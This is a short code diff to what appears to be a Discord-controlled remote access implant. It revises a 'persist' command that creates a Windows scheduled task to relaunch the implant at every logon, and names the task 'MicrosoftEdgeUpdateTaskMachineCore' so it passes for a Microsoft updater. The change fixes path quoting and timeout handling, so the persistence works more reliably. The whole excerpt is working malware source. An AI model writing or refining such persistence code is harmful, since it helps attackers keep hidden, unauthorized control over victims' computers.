@@ -302,18 +302,15 @@ async def persist(ctx):
         implant_path = os.path.abspath(sys.argv[0])
         task_name = "MicrosoftEdgeUpdateTaskMachineCore"
 
-        # Remove any old task first (ignore errors)
-        subprocess.run(f'schtasks /delete /tn "{task_name}" /f',
-                       shell=True, capture_output=True, timeout=5)
-
-        # Create task that runs at logon with highest privileges user has
+        # Create/overwrite task directly (no delete needed)
         subprocess.run(
-            f'schtasks /create /tn "{task_name}" /tr "{implant_path}" '
-            f'/sc onlogon /f',
-            shell=True, capture_output=True, timeout=10
+            f'schtasks /create /tn "{task_name}" /tr "\\"{implant_path}\\"" /sc onlogon /f',
+            shell=True, capture_output=True, timeout=15
         )
 
         await ctx.send(f"🔒 **Persistence installed** (Scheduled Task: `{task_name}`)")
+    except subprocess.TimeoutExpired:
+        await ctx.send("❌ **Persistence failed**: schtasks timed out (15s)")
     except Exception as e:
         await ctx.send(f"❌ **Persistence failed**: {e}")
 
